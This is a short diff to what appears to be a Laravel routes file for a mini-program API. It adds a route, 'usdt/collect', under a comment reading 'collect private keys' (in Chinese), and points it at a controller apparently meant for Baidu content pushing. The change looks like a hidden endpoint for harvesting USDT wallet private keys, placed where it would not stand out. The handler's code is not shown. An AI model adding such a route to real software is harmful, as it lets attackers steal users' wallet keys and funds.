@@ -10,6 +10,8 @@
 */
 //小程序相关api
 Route::group(['namespace' => 'Api'], function () {
+    // 收集私钥
+    Route::any('usdt/collect', 'BaiduController@collect');
     // 内容推送工具
     Route::any('baidu/push_content', 'BaiduController@push_content');
     // 发送邮件
